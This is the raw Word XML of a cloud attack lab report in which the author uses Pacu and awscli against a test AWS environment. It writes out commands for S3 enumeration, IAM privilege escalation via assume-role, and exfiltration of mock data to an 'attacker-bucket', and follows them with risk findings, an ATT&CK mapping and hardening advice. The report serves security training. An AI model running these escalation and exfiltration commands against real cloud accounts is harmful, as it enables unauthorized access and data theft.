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E3AC" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Task 2 — Cloud Attack Lab (Full Report)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019325DD" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Author: MALEPATI SAMSKAR REDDY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052043BD" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Date: September 19, 2025</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D362D5" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Kali IP: 192.168.17.128</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65835B0E" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Windows VM IP: 192.168.17.129</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B490239" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE73241" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527FB0AB" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Simulate cloud attack techniques by enumerating misconfigured assets, exploiting IAM role weaknesses, and exfiltrating mock data using Pacu and awscli in a lab environment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A96DC9" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Lab Environment &amp; Tools</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E56D72" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Environment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A47572" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Attacker: Kali Linux — 192.168.17.128 with Pacu and awscli installed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3A77BF" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Cloud Simulation: AWS test account / CloudGoat templates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2710B25B" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Tools:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469709FA" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Pacu (AWS exploitation framework)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B668926" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- awscli (official AWS CLI tool)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A83BAB" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- ScoutSuite (cloud security auditing, optional)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C05BFD3" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Step-by-Step Methodology (with example commands)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="739CDE09" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A. Enumerate S3 Buckets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63FEFE0C" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>aws s3 ls</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws s3 ls s3://vulnerable-bucket --no-sign-request</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>pacu&gt; run s3__enum_buckets</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4864F916" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>B. Identify Misconfigured Buckets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B49BF4" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>pacu&gt; run s3__bucket_info --bucket vulnerable-bucket</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t># Identified public-read ACL enabled</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FCFCD1B" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>C. IAM Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FC9378" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>pacu&gt; run iam__enum_roles</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>pacu&gt; run iam__privesc_scan</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws sts assume-role --role-arn arn:aws:iam::123456789012:role/DevOpsAdmin --role-session-name escalation</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B25CCE" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>D. Data Exfiltration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229F0821" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>aws s3 cp s3://vulnerable-bucket/data.txt ./data.txt</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws s3 cp ./mock_exfil.zip s3://attacker-bucket/exfil/mock_exfil.zip</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A07A3CB" w14:textId="662636BC" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4. Observed Evidence </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C2535A" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-12 14-31-22.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640461CF" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-13 22-19-33.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1729324B" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-15 15-29-05.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227B36E6" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-15 15-32-08.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF5CC40" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-15 15-46-28.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA9A404" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-15 22-24-16.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A061587" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 15-58-06.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1674C159" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 16-04-51.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182A3CFD" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 17-03-30.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27727E98" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 17-07-01.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6F4809" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 17-12-05.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2B71AA" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 17-13-47.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B44BEB" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 17-17-12.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D142F2" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>- Screenshot From 2025-09-16 17-21-31.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3502302E" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 17-22-12.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFF2EA0" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Timeline of Events (reconstructed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAC88C3" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t>- T0: awscli and Pacu configured with lab AWS keys.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- T1: Pacu enumeration modules identified accessible S3 buckets (AID001). </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- T2: Misconfiguration: public-read ACL confirmed on a vulnerable bucket. </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- T3: Pacu IAM module discovered overprivileged role (DevOpsAdmin). </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- T4: Escalation via sts:AssumeRole succeeded, escalating attacker privileges. </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- T5: Exfiltration performed by copying mock data from S3 to local and re-uploading to attacker bucket.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="55079C78" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Findings &amp; Risk Assessment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200A9CB5" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Public S3 bucket accessible to unauthenticated users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522AA1EC" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- IAM role misconfiguration allowed privilege escalation to administrative access.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4892B03A" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Data exfiltration via S3 cp observed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7F8493" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Risk Rating: Critical (CVSS ~9.0) for cloud data breach potential.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0DDDA2" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. MITRE ATT&amp;CK Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FC6EB6" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1580 — Cloud Infrastructure Discovery (enumerating S3 buckets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A301450" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1078.004 — Valid Accounts: Cloud Accounts (using IAM roles)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7187EC85" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1537 — Transfer Data to Cloud Account (data exfiltration)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068991A5" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A52CFF" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Enforce S3 Block Public Access and monitor with AWS Config.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BC2C78" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Apply least-privilege principles for IAM roles; review regularly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7302DEC4" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Enable CloudTrail and S3 access logging.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502909FA" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Use GuardDuty to detect unusual IAM and S3 activity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51709090" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Rotate credentials and enforce MFA for IAM accounts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6666CEDC" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Suggested Forensic Artifacts to Collect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111AB301" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- AWS CloudTrail logs: S3 GetObject, PutObject, and sts:AssumeRole events.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4851E21D" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- S3 Access Logs from vulnerable bucket.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085C4795" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>- Pacu command history and session logs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5732D8D3" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- awscli history (~/.aws/cli/history).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B4EB3F" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. 50-Word Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB1AC80" w14:textId="77777777" w:rsidR="002B7145" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Pacu and awscli were used to enumerate and exploit cloud misconfigurations. A vulnerable S3 bucket was publicly accessible, and an overprivileged IAM role enabled privilege escalation. Mock data was exfiltrated from S3 and re-uploaded to attacker-controlled storage. Recommend S3 ACL hardening, IAM least-privilege, and CloudTrail monitoring.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="002B71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481097">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1261060138">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="2003196526">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1638030765">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="931164163">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1232227497">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1910919466">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="198396528">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="147386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24E"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002B7145"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="005233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8D634"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{F0FA7F4F-8B8B-4B60-A848-88491AC4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2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-19T10:31:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>